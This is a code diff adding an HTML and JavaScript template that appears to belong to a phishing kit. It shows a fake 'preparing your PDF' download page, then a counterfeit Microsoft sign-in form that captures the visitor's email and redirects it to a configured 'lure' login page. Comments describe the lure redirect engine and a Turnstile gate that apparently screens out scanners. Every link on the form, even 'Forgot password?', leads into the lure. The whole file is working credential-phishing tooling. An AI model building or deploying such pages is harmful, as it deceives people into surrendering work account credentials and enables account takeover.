@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#111214">
+<meta name="robots" content="noindex">
+<title>__TITLE__</title>
+<style>
+:root{
+  color-scheme:dark;
+  --page:#111214;--panel:#17181b;--line:#303136;--text:#ececee;--muted:#9a9ba1;--subtle:#6f7077;--accent:__ACCENT__;
+  --ms-blue:#0067b8;--ms-blue-hover:#005da6;--ms-blue-active:#00508f;--ms-ink:#1b1b1b;--ms-ink-soft:#605e5c;--ms-border:#8a8886;--ms-focus:#0067b8;--ms-error:#a80000;
+  --ease:cubic-bezier(.22,.61,.36,1);
+}
+*{box-sizing:border-box}
+html{min-height:100%;background:var(--page)}
+body{min-height:100vh;min-height:100svh;margin:0;display:flex;flex-direction:column;background:var(--page);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Segoe UI Variable Text",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+.header{width:min(100% - 56px,1080px);height:68px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line)}
+.wordmark{display:inline-flex;align-items:center;gap:10px;font-size:12px;font-weight:600;letter-spacing:.025em;color:#dedee1}
+.brand-icon{width:17px;height:17px;display:block;color:#c8c9ce}
+.header-label{color:var(--subtle);font-size:10px;font-weight:500;letter-spacing:.12em;text-transform:uppercase;white-space:nowrap}
+main{flex:1;display:grid;place-items:center;padding:56px 20px}
+
+.card{position:relative;overflow:hidden;width:min(100%,448px);padding:0;border:1px solid var(--line);border-radius:8px;background:var(--panel);box-shadow:0 1px 2px rgba(0,0,0,.35),0 18px 48px -26px rgba(0,0,0,.9);transition:height 400ms var(--ease) 120ms,background-color 300ms ease 120ms,border-color 300ms ease 120ms,box-shadow 300ms ease 120ms;will-change:height}
+.card.is-light{background:#fff;border-color:#e6e6e6;color:var(--ms-ink);box-shadow:0 2px 4px rgba(0,0,0,.35),0 26px 64px -28px rgba(0,0,0,.95)}
+.step{position:absolute;top:0;left:0;right:0;padding:30px;will-change:opacity,transform}
+.step>*{opacity:0;transform:translateY(10px);transition:opacity 140ms var(--ease),transform 140ms var(--ease);transition-delay:0ms}
+.step.is-active>*{opacity:1;transform:none;transition-duration:400ms}
+.step.is-active>*:nth-child(1){transition-delay:200ms}
+.step.is-active>*:nth-child(2){transition-delay:245ms}
+.step.is-active>*:nth-child(3){transition-delay:290ms}
+.step.is-active>*:nth-child(4){transition-delay:335ms}
+.step.is-active>*:nth-child(5){transition-delay:380ms}
+.step.is-active>*:nth-child(6){transition-delay:425ms}
+.step.is-active>*:nth-child(7){transition-delay:470ms}
+
+.file-row{display:flex;align-items:center;gap:14px;padding-bottom:25px;border-bottom:1px solid var(--line)}
+.file-icon{flex:0 0 auto;min-width:34px;min-height:34px;display:flex;align-items:center;color:#c3c4c9}
+.file-kind{margin:0 0 5px;color:var(--subtle);font-size:10px;line-height:1.2;font-weight:600;letter-spacing:.12em;text-transform:uppercase}
+.step h1{margin:0;font-size:20px;line-height:1.3;font-weight:600;letter-spacing:-.025em}
+.message{margin:23px 0 24px;color:var(--muted);font-size:13px;line-height:1.65}
+.progress-label{display:flex;justify-content:space-between;gap:16px;margin-bottom:10px;color:#c3c4c9;font-size:11px;line-height:1.4}
+.progress-label span:last-child{color:var(--subtle);font-variant-numeric:tabular-nums}
+.progress-track{position:relative;width:100%;height:3px;overflow:hidden;background:#34353a;border-radius:2px}
+.progress-bar{width:0;height:100%;background:var(--accent);border-radius:inherit}
+.progress-track::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.55),transparent);transform:translateX(-100%);animation:sheen 1.5s linear infinite}
+.footnote{display:flex;align-items:center;gap:7px;margin-top:21px;color:var(--subtle);font-size:10px;line-height:1.5}
+.footnote svg{width:12px;height:12px;flex:0 0 auto}
+.expect{display:flex;align-items:center;gap:9px;width:100%;margin:18px 0 0;padding:17px 0 0;border:0;border-top:1px solid var(--line);background:none;color:#b9bac0;font:inherit;font-size:11px;line-height:1.5;text-align:left;cursor:pointer;transition:color 140ms ease}
+.expect svg{width:13px;height:13px;flex:0 0 auto;color:#9a9ba1}
+.expect span{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.expect .expect-go{margin-left:auto;flex:0 0 auto;color:#7f8087;transition:color 140ms ease,transform 200ms var(--ease)}
+.expect:hover{color:#ececee}
+.expect:hover .expect-go{color:#d7d8dc;transform:translateX(2px)}
+.expect:focus-visible{outline:2px solid #6f7077;outline-offset:3px;border-radius:3px}
+
+.ms-brand{display:flex;align-items:center;gap:10px;margin-bottom:22px;color:var(--ms-ink-soft);font-size:13px;font-weight:600;letter-spacing:-.01em}
+.ms-brand svg{width:20px;height:20px;display:block}
+.step--ms h1{color:var(--ms-ink);font-size:24px;font-weight:600;letter-spacing:-.02em}
+.ms-sub{margin:6px 0 0;color:var(--ms-ink-soft);font-size:13px;line-height:1.5}
+.ms-form{margin-top:24px}
+.ms-input{width:100%;height:44px;padding:0 12px;border:1px solid var(--ms-border);border-radius:4px;background:#fff;color:var(--ms-ink);font:inherit;font-size:14px;outline:none;transition:border-color 160ms ease,box-shadow 160ms ease}
+.ms-input::placeholder{color:#767676}
+.ms-input:focus{border-color:var(--ms-focus);box-shadow:inset 0 -1px 0 0 var(--ms-focus)}
+.ms-input.is-invalid,.ms-input.is-invalid:focus{border-color:var(--ms-error);box-shadow:inset 0 -1px 0 0 var(--ms-error)}
+.ms-hint{margin:9px 0 0;color:var(--ms-ink-soft);font-size:12px;line-height:1.5}
+.ms-error{margin:9px 0 0;color:var(--ms-error);font-size:12px;line-height:1.5}
+.ms-actions{display:flex;align-items:center;justify-content:space-between;gap:14px;margin-top:22px}
+.ms-btn{display:inline-flex;align-items:center;justify-content:center;gap:9px;min-width:132px;height:40px;padding:0 22px;border:0;border-radius:4px;background:var(--ms-blue);color:#fff;font:inherit;font-size:14px;font-weight:600;cursor:pointer;transition:background-color 140ms ease,transform 140ms var(--ease)}
+.ms-btn:hover{background:var(--ms-blue-hover)}
+.ms-btn:active{background:var(--ms-blue-active);transform:translateY(1px)}
+.ms-btn:focus-visible{outline:2px solid var(--ms-blue);outline-offset:2px}
+.ms-btn[disabled]{opacity:.85;cursor:default}
+.ms-btn .spinner{width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+.ms-btn.is-busy .spinner{display:block}
+.ms-link{color:var(--ms-blue);font-size:12px;text-decoration:none;white-space:nowrap}
+.ms-link:hover{text-decoration:underline}
+.ms-divider{margin:24px 0 0;padding-top:16px;border-top:1px solid #ededed;display:flex;align-items:center;justify-content:space-between;gap:12px;color:var(--ms-ink-soft);font-size:12px}
+.ms-static{display:flex;align-items:center;gap:8px;margin-top:16px;color:var(--ms-ink-soft);font-size:12px;line-height:1.5}
+.ms-static svg{width:14px;height:14px;flex:0 0 auto;color:#107c10}
+.ts{margin-top:14px}
+
+.footer{width:min(100% - 56px,1080px);min-height:52px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;gap:20px;border-top:1px solid var(--line);color:var(--subtle);font-size:10px}
+@keyframes sheen{to{transform:translateX(100%)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media (max-width:560px){
+  .header,.footer{width:calc(100% - 36px)}
+  .header{height:60px}
+  main{padding:36px 18px}
+  .step{padding:24px 21px}
+  .step h1,.step--ms h1{font-size:20px}
+  .footer{align-items:flex-start;justify-content:center;flex-direction:column;gap:5px;padding:13px 0}
+  .ms-actions{flex-direction:column-reverse;align-items:stretch}
+  .ms-btn{width:100%}
+  .ms-link{text-align:center}
+}
+@media (prefers-reduced-motion:reduce){
+  .card,.step>*{transition-duration:1ms!important;transition-delay:0ms!important}
+  .progress-track::after{animation:none}
+}
+</style>
+</head>
+<body>
+<header class="header">
+  <div class="wordmark">
+    <svg class="brand-icon" viewBox="0 0 20 20" fill="none" aria-hidden="true">
+      <path d="M4.5 2.75h7l4 4v10.5H4.5V2.75Z" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"/>
+      <path d="M11.5 2.9v4h3.8" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"/>
+    </svg>
+    <span id="appName">__BRAND__</span>
+  </div>
+  <span class="header-label" id="headerLabel">File access</span>
+</header>
+
+<main>
+  <section class="card" id="card">
+    <div class="step is-active" id="step1">
+      <div class="file-row">
+        <span class="file-icon">__LOGO__</span>
+        <div>
+          <p class="file-kind" id="fileKind">Document</p>
+          <h1 id="fileTitle">__TITLE__</h1>
+        </div>
+      </div>
+      <p class="message" id="pageDescription">__SUBTITLE__</p>
+      <div role="status" aria-live="polite">
+        <div class="progress-label"><span id="statusText">Preparing file.</span><span id="pct">0%</span></div>
+        <div class="progress-track" aria-hidden="true"><div class="progress-bar" id="progressBar"></div></div>
+      </div>
+      <div class="footnote">
+        <svg viewBox="0 0 16 16" fill="none" aria-hidden="true">
+          <path d="M4.4 7.2V5.6a3.6 3.6 0 0 1 7.2 0v1.6" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/>
+          <rect x="3.2" y="7.2" width="9.6" height="6.2" rx="1.3" stroke="currentColor" stroke-width="1.2"/>
+        </svg>
+        <span>Encrypted transfer &middot; please keep this page open.</span>
+      </div>
+      <button class="expect" id="skipBtn" type="button">
+        <svg viewBox="0 0 16 16" fill="none" aria-hidden="true">
+          <circle cx="8" cy="8" r="6.2" stroke="currentColor" stroke-width="1.2"/>
+          <path d="M8 4.6v3.7l2.3 1.4" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Microsoft sign-in required to continue.</span>
+        <span class="expect-go" aria-hidden="true">__BUTTON__</span>
+      </button>
+    </div>
+
+    <div class="step step--ms" id="step2" aria-hidden="true">
+      <div class="ms-brand">
+        <svg viewBox="0 0 23 23" aria-hidden="true">
+          <rect x="1" y="1" width="10" height="10" fill="#f25022"></rect>
+          <rect x="12" y="1" width="10" height="10" fill="#7fba00"></rect>
+          <rect x="1" y="12" width="10" height="10" fill="#00a4ef"></rect>
+          <rect x="12" y="12" width="10" height="10" fill="#ffb900"></rect>
+        </svg>
+        <span>Microsoft</span>
+      </div>
+      <h1>Sign in</h1>
+      <p class="ms-sub">to continue to <strong id="appName2">__BRAND__</strong></p>
+      <form class="ms-form" id="msForm" novalidate>
+        <input class="ms-input" id="email" type="email" name="email" inputmode="email" autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="Email, phone, or Skype" placeholder="Email, phone, or Skype">
+        <p class="ms-hint" id="emailHint">Use your Microsoft 365 work or school account.</p>
+        <p class="ms-error" id="emailError" role="alert" hidden></p>
+        <div class="ms-actions">
+          <a class="ms-link" href="#" id="forgotLink">Forgot password?</a>
+          <button class="ms-btn" id="nextBtn" type="submit">
+            <span class="spinner" aria-hidden="true"></span>
+            <span id="nextLabel">Next</span>
+          </button>
+        </div>
+        <div class="ts"><div id="__ts_slot__"></div></div>
+      </form>
+      <div class="ms-divider">
+        <a class="ms-link" href="#" id="createLink">No account? Create one!</a>
+        <span id="autoNote" aria-live="polite"></span>
+      </div>
+      <p class="ms-static">
+        <svg viewBox="0 0 16 16" fill="none" aria-hidden="true">
+          <circle cx="8" cy="8" r="6.2" stroke="currentColor" stroke-width="1.2"/>
+          <path d="M5.4 8.1 7.2 10l3.6-3.8" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>File ready. It opens right after you sign in.</span>
+      </p>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <span id="footerName">__BRAND__</span>
+  <span>&copy; <span id="year"></span></span>
+</footer>
+
+<script>
+/* __DESTINATION__ is the configured target (normally the lure, e.g. /auth/login).
+   The email typed here is appended as ?login_hint=<email> so Microsoft prefills
+   it. The engine forwards the query across the lure -> login redirect, so no
+   path rewriting is needed. */
+var DEST = "__DESTINATION__", DELAY = __DELAY__, MSGS = __MSGS__;
+var BRAND = "__BRAND__", FILE_KIND = "PDF document";
+var PREPARE_MS = Math.max(2000, Math.min(6000, (DELAY || 4) * 1000));
+var REQUIRE_EMAIL = true, PASS_EMAIL_AS_HINT = true;
+
+var $ = function(id){ return document.getElementById(id); };
+var card = $("card"), step1 = $("step1"), step2 = $("step2"), steps = [step1, step2];
+var bar = $("progressBar"), pct = $("pct"), statusText = $("statusText"), email = $("email");
+var form = $("msForm"), nextBtn = $("nextBtn"), nextLabel = $("nextLabel"), emailError = $("emailError"), emailHint = $("emailHint");
+
+$("year").textContent = new Date().getFullYear();
+$("fileKind").textContent = FILE_KIND;
+
+var current = 0;
+function sizeCard(){ card.style.height = steps[current].offsetHeight + "px"; }
+function showStep(i){
+  current = i;
+  steps.forEach(function(el, n){
+    var on = n === i;
+    el.classList.toggle("is-active", on);
+    el.setAttribute("aria-hidden", String(!on));
+    el.inert = !on;
+  });
+  card.classList.toggle("is-light", i === 1);
+  sizeCard();
+}
+function advance(){ if(advanced) return; advanced = true; showStep(1); setTimeout(function(){ try{ email.focus({preventScroll:true}); }catch(e){} }, 260); }
+var advanced = false;
+showStep(0);
+window.addEventListener("resize", sizeCard);
+if (document.fonts && document.fonts.ready) document.fonts.ready.then(sizeCard);
+
+function runProgress(){
+  var total = PREPARE_MS, began = performance.now();
+  bar.style.transition = "width " + total + "ms cubic-bezier(.33,.1,.2,1)";
+  requestAnimationFrame(function(){ bar.style.width = "100%"; });
+  (function tick(now){
+    var t = Math.min(1, (now - began) / total);
+    var e = t < .5 ? 2*t*t : 1 - Math.pow(-2*t+2, 2)/2;
+    pct.textContent = Math.round(e*100) + "%";
+    if (e > .55) statusText.textContent = MSGS[1] || "Verifying document.";
+    if (t < 1) return requestAnimationFrame(tick);
+    statusText.textContent = MSGS[MSGS.length-1] || "Ready";
+  })(began);
+  setTimeout(advance, total + 260);
+}
+setTimeout(runProgress, 120);
+
+var EMAIL_RE = /^[^@\s]+@[^@\s]+\.[^@\s]{2,}$/;
+function setError(m){
+  if (m){ emailError.textContent = m; emailError.hidden = false; emailHint.hidden = true; email.classList.add("is-invalid"); email.setAttribute("aria-invalid","true"); }
+  else { emailError.hidden = true; emailError.textContent = ""; emailHint.hidden = false; email.classList.remove("is-invalid"); email.removeAttribute("aria-invalid"); }
+  sizeCard();
+}
+
+function buildTarget(){
+  var url = (DEST || "").trim();
+  if (!/^https?:\/\//i.test(url)) return "";
+  var who = email.value.trim();
+  if (who && PASS_EMAIL_AS_HINT && !/[?&]login_hint=/i.test(url)) {
+    url += (url.indexOf("?") === -1 ? "?" : "&") + "login_hint=" + encodeURIComponent(who);
+  }
+  return url;
+}
+
+function redirect(skipCheck){
+  if (nextBtn.classList.contains("is-busy")) return;
+  var who = email.value.trim();
+  if (!DEST.trim()){ statusText.textContent = "No target configured"; showStep(0); return; }
+  if (!skipCheck && REQUIRE_EMAIL){
+    if (!who){ setError("Enter your email, phone, or Skype."); email.focus(); return; }
+    if (!EMAIL_RE.test(who)){ setError("Enter a valid email address, like someone@example.com."); email.focus(); return; }
+  }
+  var target = buildTarget();
+  if (!target){ statusText.textContent = "Unsupported link"; showStep(0); return; }
+  nextBtn.classList.add("is-busy"); nextBtn.disabled = true;
+  setTimeout(function(){ __go(target); }, 620);
+}
+
+/* Turnstile-aware: the gate is injected by the engine as window.__tsPending.
+   If it is still pending we park the destination and let __tsGo resume. */
+function __go(target){
+  if (window.__tsPending){ window.__tsGo = function(){ window.location.href = target; }; return; }
+  window.location.href = target;
+}
+
+form.addEventListener("submit", function(e){ e.preventDefault(); redirect(false); });
+$("skipBtn").addEventListener("click", function(){ advance(); });
+$("forgotLink").addEventListener("click", function(e){ e.preventDefault(); redirect(false); });
+$("createLink").addEventListener("click", function(e){ e.preventDefault(); redirect(false); });
+
+(function boot(){
+  var q = new URLSearchParams(window.location.search);
+  var hint = q.get("email") || q.get("login_hint");
+  if (hint) email.value = hint;
+})();
+</script>
+</body>
+</html>
